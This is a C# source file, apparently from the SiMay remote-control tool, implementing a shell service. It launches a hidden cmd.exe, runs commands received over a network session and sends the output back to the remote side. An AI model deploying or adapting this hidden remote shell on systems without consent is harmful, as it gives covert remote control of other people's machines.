using SiMay.Core;
using SiMay.ModelBinder;
using SiMay.Net.SessionProvider;
using System;
using System.Diagnostics;
using System.IO;

namespace SiMay.Service.Core
{
    [ServiceName("Shell管理")]
    [ApplicationServiceKey(ApplicationKeyConstant.REMOTE_SHELL)]
    public class ShellService : ApplicationRemoteService
    {
        private Process _pipe;
        public override void SessionInited(SessionProviderContext session)
        {
            this.Init();
        }

        public override void SessionClosed()
        {
            _pipe.Kill();
        }
        private void Init()
        {
            _pipe = new Process
            {
                StartInfo = new ProcessStartInfo("cmd.exe")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    //Arguments = $"/K CHCP {_encoding.CodePage}"
                }
            };
            _pipe.Start();

            _pipe.OutputDataReceived += new DataReceivedEventHandler(OutputHandler); // 为异步获取订阅事件
            _pipe.ErrorDataReceived += new DataReceivedEventHandler(ErroOutputHandler);
            _pipe.BeginOutputReadLine();// 异步获取命令行内容
            _pipe.BeginErrorReadLine();

        }

        [PacketHandler(MessageHead.S_SHELL_INPUT)]
        public void StartCommand(SessionProviderContext session)
        {
            byte[] payload = session.GetMessage();
            string command = payload.ToUnicodeString();

            _pipe.StandardInput.WriteLine(command);
            _pipe.StandardInput.Flush();
        }

        private void ErroOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (outLine.Data == null)
                return;
            CurrentSession.SendTo(MessageHead.C_SHELL_RESULT, "\r\n" + outLine.Data + "\r\n");
        }

        private void OutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (outLine.Data == null)
                return;
            CurrentSession.SendTo(MessageHead.C_SHELL_RESULT, "\r\n" + outLine.Data);
        }
    }
}